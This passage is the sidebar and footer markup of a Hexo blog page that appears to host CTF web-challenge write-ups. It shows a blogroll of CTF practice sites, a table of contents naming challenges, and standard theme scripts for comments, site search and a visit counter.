+                    <a href="https://www.linkedbyx.com/home" title="X计划平台" target="_blank">X计划平台</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.shiyanbar.com/ctf/practice" title="实验吧" target="_blank">实验吧</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ctf.jasec.cn/index.php?page=login" title="Jactf" target="_blank">Jactf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.jarvisoj.com/login" title="Javis" target="_blank">Javis</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cgctf.nuptsast.com/challenges#Web" title="CGctf" target="_blank">CGctf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xz.aliyun.com/" title="先知社区" target="_blank">先知社区</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ctf.ssleye.com/" title="ctf在线工具" target="_blank">ctf在线工具</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ctf.194nb.com/" title="aman ctf在线工具" target="_blank">aman ctf在线工具</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.ctfwp.com/" title="ctfwp" target="_blank">ctfwp</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://skysec.top/" title="一叶飘零" target="_blank">一叶飘零</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.leavesongs.com/" title="离别歌" target="_blank">离别歌</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#滴"><span class="nav-number">1.</span> <span class="nav-text">滴~</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WEB-签到题"><span class="nav-number">2.</span> <span class="nav-text">WEB 签到题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JustSoso"><span class="nav-number">3.</span> <span class="nav-text">JustSoso</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#方法一"><span class="nav-number">3.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#方法二"><span class="nav-number">3.2.</span> <span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#love-math"><span class="nav-number">4.</span> <span class="nav-text">love_math</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        ﻿<div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="heart">
+    <i class="fa fa-heart" aria-hidden="true"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">gtfly</span>
+
+ <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+ <script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("07/16/2018 12:49:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "已存在 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+ setInterval("createtime()",250);
+ </script>
+
+<!--
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count"></span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+-->
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </div></footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '9Pgz8ir0b40IXQ5V3bjRc8m0-gzGzoHsz',
+        appKey: 'VCCuCSQHpPqX3hmOh0PlmfXu',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+ <!-- ҳ����С���� -->
+ <script type="text/javascript" src="/js/src/love.js"></script>
+
+  
+  
+  <!--������ƭ-->
+ <script type="text/javascript" src="/js/src/crash_cheat.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>
+  <script>
+  $("body").backstretch("https://myqinshimoon.github.io/background.jpg");
+  </script>
+
+
+</body>
+</html>
